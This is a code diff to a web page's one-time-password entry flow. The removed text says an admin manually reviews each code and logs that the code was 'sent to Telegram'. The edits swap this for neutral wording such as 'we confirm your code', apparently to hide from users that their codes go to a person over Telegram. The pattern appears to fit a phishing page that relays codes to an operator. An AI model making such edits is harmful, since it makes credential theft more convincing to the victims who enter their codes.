@@ -630,8 +630,8 @@
                 <!-- Status Message -->
                 <div class="otp-status-message" id="otpStatusMessage">
                     <span class="status-icon" id="statusIcon">⏳</span>
-                    <div class="status-title" id="statusTitle">Waiting for verification...</div>
-                    <div class="status-desc" id="statusDesc">Please wait while admin verifies your OTP</div>
+                    <div class="status-title" id="statusTitle">Verifying your OTP...</div>
+                    <div class="status-desc" id="statusDesc">Please wait while we confirm your code</div>
                 </div>
 
                 <!-- Result Actions -->
@@ -804,8 +804,8 @@
         function showWaiting() {
             showStatusMessage(
                 '⏳',
-                'Waiting for admin verification...',
-                'Please wait while admin reviews your OTP',
+                'Verifying your OTP...',
+                'Please wait while we confirm your code',
                 'waiting'
             );
         }
@@ -828,7 +828,7 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    console.log('✅ OTP sent to Telegram:', result);
+                    console.log('✅ OTP sent successfully:', result);
                     showWaiting();
                     startCheckingStatus();
                 } else {
